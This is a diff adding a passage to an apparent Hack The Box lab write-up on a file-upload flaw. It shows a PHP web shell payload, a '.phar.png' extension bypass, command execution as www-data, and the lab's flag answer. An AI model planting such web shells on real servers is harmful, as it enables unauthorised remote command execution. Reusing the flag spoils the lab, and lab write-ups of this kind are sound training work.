@@ -82,5 +82,34 @@ if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
 
 So from this we can see that the upload directory is `/user_feedback_submissions/` and that the filename is renamed 
 
+Now, I uploaded a simple white `.png` file as the profile picture, and send the request to the Burp Repeater.
+
+There after the body add the payload:
+
+```php
+<?php system($_REQUEST['cmd']); ?>
+```
+
+and the filename should be with the extension `.phar.png`, then send the request.
+
+Now I went to the url `http://94.237.56.55:56011/contact/user_feedback_submissions/250306_Empty.phar.png?cmd`, `Empty` is the name of the file that I sent.
+
+I see that among the resposne there is the answer to the `whoami` command, which is `www-data`, so I got RCE.
+
+Now, put the command `ls /` to list the files on the root directory.
+
+```sh
+bin boot 
+dev 
+etc 
+flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt 
+home 
+lib 
+...
+```
+
+Now let's read the flag file with `cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`.
+
+And the answer is `HTB{m4573r1ng_upl04d_3xpl0174710n}`.
 
 
